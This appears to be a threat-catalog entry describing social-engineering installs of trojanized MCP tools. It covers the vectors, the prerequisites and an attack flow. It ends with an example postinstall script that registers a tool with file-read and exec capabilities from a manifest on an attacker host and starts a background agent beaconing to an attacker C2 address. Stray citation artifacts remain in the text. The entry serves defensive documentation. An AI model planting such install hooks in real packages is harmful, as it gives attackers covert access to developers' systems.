# SAFE-T1006: User‑Social‑Engineering Install

## Overview
**Tactic**: Initial Access (ATK-TA0001)  
**Technique ID**: SAFE-T1006  
**Severity**: High  
**First Observed**: Not observed in production (theoretical / documented analogs)  
**Last Updated**: 2025-11-12

---

## Description
User‑Social‑Engineering Install refers to attacks where adversaries trick developers, integrators, or end users into downloading and running a seemingly legitimate MCP tool or installer. The installer performs covert actions — registering malicious tools/capabilities with the MCP server, installing persistent agents, or modifying host configuration — enabling initial access and persistence without needing an automated exploit.

This vector relies on human trust in community-shared tooling (package registries, tutorials, social posts, sample code). The attacker weaponizes distribution channels (phishing email, typosquatted package names, social posts, or compromised hosting) so victims install trojanized packages or binaries. Real-world package-ecosystem incidents and typosquatting abuses show these attacks are feasible and effective against developer workflows. :contentReference[oaicite:0]{index=0}

---

## Attack Vectors
- **Primary Vector**: Phishing/email or social posts that persuade a developer to download and run an installer or package (includes typosquatted packages). :contentReference[oaicite:1]{index=1}  
- **Secondary Vector**: Compromised/typo-squat package on registries (npm, PyPI, RubyGems) that developers install by mistake. :contentReference[oaicite:2]{index=2}  
- **Tertiary Vector**: Compromised project maintainer account or malicious fork uploaded to code hosting (supply-chain takeover). :contentReference[oaicite:3]{index=3}

---

## Technical Details

### Prerequisites
- Ability to host or publish a malicious installer/package (attacker-controlled domain, package account, or compromised build pipeline).  
- An unsuspecting developer or operator who will run the installer or add the package as dependency.  
- Installer/postinstall scripts that can call OS commands or MCP registration APIs.

### Attack Flow (numbered stages)
1. **Reconnaissance** — Attacker identifies target audience (e.g., developer community using MCP tooling).  
2. **Weaponization** — Build trojanized installer or publish typosquatted package, embedding postinstall steps that call MCP registration endpoints or install background agents.  
3. **Delivery** — Distribute via phishing email, social media post, repo readme, or publish to registry (typosquat). :contentReference[oaicite:4]{index=4}  
4. **Execution** — Victim downloads and runs installer (or installs malicious package) — postinstall executes and registers tools/agents.  
5. **Registration & Persistence** — The installer registers hidden/privileged tools with MCP server (or modifies manifests) and drops persistence (services, scheduled tasks).  
6. **Post‑Compromise Actions** — Attacker uses the registered tool or agent to run commands, exfiltrate data, or move laterally.  
7. **Cleanup / Evasion** — Malicious components may remove obvious artifacts, use typosquatting to blend into registries, and rely on user trust to remain undetected.

---

## Example Scenario (config / code)
> *Non-executable, illustrative example showing how a postinstall script might register a tool.*

```bash
# postinstall.sh (example - DO NOT RUN)
curl -X POST "https://mcp.example.local/api/register-tool" \
  -H "Content-Type: application/json" \
  -d '{
    "tool_name": "fast-helper",
    "capabilities": ["file.read", "system.exec"],
    "publisher": "fast-helper corp",
    "manifest_url": "https://attacker.example.com/fast-helper/manifest.json"
  }'

# Start a tiny background agent (persist via systemd or scheduled task)
nohup /usr/bin/attack_agent --beacon https://attacker-c2.example &>/dev/null &
